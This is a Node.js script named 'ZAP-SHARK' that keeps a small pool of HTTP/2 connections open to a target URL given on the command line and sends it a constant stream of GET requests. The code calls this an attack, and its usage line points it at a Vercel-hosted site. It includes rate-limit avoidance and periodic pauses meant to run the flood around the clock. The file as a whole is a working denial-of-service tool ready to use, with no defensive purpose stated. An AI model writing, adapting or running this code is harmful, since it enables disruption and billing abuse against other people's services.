const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.host = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // BALANCED APPROACH
        this.connectionPool = [];
        this.poolSize = 2; // Less connections = more stable
        this.maxStreams = 50;
        this.activeStreams = 0;
        
        // REAL REQUEST TRACKING
        this.realRequestsSent = 0;
        this.realResponsesReceived = 0;
        this.realRPS = 0;
        this.lastRealCheck = Date.now();
        
        // RATE LIMIT AVOIDANCE
        this.requestPattern = 'balanced'; // 'steady' or 'burst'
        this.requestInterval = 0.3; // ms
        this.lastRequestTime = Date.now();
        
        // MAINTENANCE
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        this.attackInterval = null;
        this.statsInterval = null;
    }

    async setupConnections() {
        for (let i = 0; i < this.poolSize; i++) {
            await this.createConnection(i);
            await this.delay(500); // Slow connection setup
        }
    }

    createConnection(index) {
        return new Promise((resolve) => {
            const client = http2.connect(this.targetUrl);
            
            client.on('connect', () => {
                this.connectionPool.push(client);
                console.log(`[ZAP-SHARK] Connection ${index+1} ready`);
                resolve(true);
            });
            
            client.on('error', (err) => {
                console.log(`[ZAP-SHARK] Connection ${index+1} failed: ${err.code}`);
                setTimeout(() => this.createConnection(index), 2000);
                resolve(false);
            });
            
            // Track server limits
            client.on('remoteSettings', (settings) => {
                if (settings.maxConcurrentStreams) {
                    this.maxStreams = Math.min(settings.maxConcurrentStreams, 100);
                }
            });
        });
    }

    sendRealRequest() {
        if (this.connectionPool.length === 0) return;
        
        const now = Date.now();
        if (now - this.lastRequestTime < this.requestInterval) return;
        
        this.lastRequestTime = now;
        this.totalRequests++;
        this.requestsSinceLastCalc++;
        this.realRequestsSent++;
        
        const client = this.connectionPool[this.realRequestsSent % this.connectionPool.length];
        
        try {
            this.activeStreams++;
            
            const req = client.request({
                ':method': 'GET',
                ':path': '/',
                ':authority': this.host,
                'user-agent': 'Mozilla/5.0',
                'accept': '*/*'
            });
            
            let responseReceived = false;
            
            // TIMEOUT: If no response in 2s, close
            const timeout = setTimeout(() => {
                if (!responseReceived) {
                    req.close();
                    this.activeStreams--;
                }
            }, 2000);
            
            req.on('response', (headers) => {
                responseReceived = true;
                clearTimeout(timeout);
                this.realResponsesReceived++;
                
                // Read response body (important for Vercel tracking)
                req.on('data', () => {});
                req.on('end', () => {
                    this.activeStreams--;
                });
            });
            
            req.on('error', () => {
                clearTimeout(timeout);
                this.activeStreams--;
            });
            
            req.end();
            
        } catch (err) {
            this.activeStreams--;
        }
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
        
        // Real RPS (responses actually received)
        const realTimeDiff = (now - this.lastRealCheck) / 1000;
        if (realTimeDiff >= 1.0) {
            this.realRPS = this.realResponsesReceived / realTimeDiff;
            this.realResponsesReceived = 0;
            this.lastRealCheck = now;
        }
    }

    updateDisplay() {
        this.calculateRPS();
        
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        
        // VERIFIED METRICS - matches what Vercel sees
        const verifiedRPS = Math.min(this.currentRPS, this.realRPS * 1.5);
        
        process.stdout.write(
            `\rZAP-SHARK: (${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}) | (${this.status}) ` +
            `TOTAL: ${this.totalRequests} | ` +
            `RPS: ${verifiedRPS.toFixed(1)} | ` +
            `REAL: ${this.realRPS.toFixed(1)} | ` +
            `ACTIVE: ${this.activeStreams}/${this.maxStreams}`
        );
    }

    // STEADY 24/7 ATTACK - NO DROPS
    startSteadyAttack() {
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                // Send 1-3 requests per tick for steady flow
                const requestsThisTick = Math.min(3, this.maxStreams - this.activeStreams);
                for (let i = 0; i < requestsThisTick; i++) {
                    this.sendRealRequest();
                }
                this.updateDisplay();
            }
        }, 10); // 10ms = 100 RPS per connection max
    }

    flushDNS() {
        exec('echo "Flushing DNS..."', () => {});
    }

    flushSockets() {
        this.connectionPool.forEach(client => {
            try { client.destroy(); } catch (e) {}
        });
        this.connectionPool = [];
        this.activeStreams = 0;
    }

    scheduleMaintenance() {
        const now = Date.now();
        if (now - this.lastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            console.log('\n[ZAP-SHARK] === MAINTENANCE (10m) ===');
            this.status = "PAUSED";
            
            clearInterval(this.attackInterval);
            this.flushDNS();
            this.flushSockets();
            
            setTimeout(() => {
                console.log('[ZAP-SHARK] === RESUMING ===');
                this.status = "ATTACKING";
                this.lastMaintenance = Date.now();
                this.setupConnections();
                setTimeout(() => this.startSteadyAttack(), 2000);
            }, this.maintenanceDuration);
        }
    }

    async start() {
        console.log('[ZAP-SHARK] === STEADY MODE ===');
        console.log('[ZAP-SHARK] Target:', this.targetUrl);
        console.log('[ZAP-SHARK] Strategy: Steady requests (no drops)');
        console.log('='.repeat(50));
        
        await this.setupConnections();
        
        setTimeout(() => {
            this.startSteadyAttack();
            
            // Maintenance check every minute
            setInterval(() => this.scheduleMaintenance(), 60000);
            
            // Connection health
            setInterval(() => {
                if (this.connectionPool.length < this.poolSize) {
                    this.createConnection(this.connectionPool.length);
                }
            }, 10000);
            
        }, 3000);
        
        process.on('SIGINT', () => {
            console.log('\n[ZAP-SHARK] Stopped by user');
            this.cleanup();
            process.exit(0);
        });
    }

    cleanup() {
        this.running = false;
        clearInterval(this.attackInterval);
        this.flushSockets();
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// RUN
const target = process.argv[2];
if (!target) {
    console.log('Usage: node zap-shark-steady.js https://your-vercel.vercel.app');
    process.exit(1);
}

const shark = new ZAPSHARK(target);
shark.start();
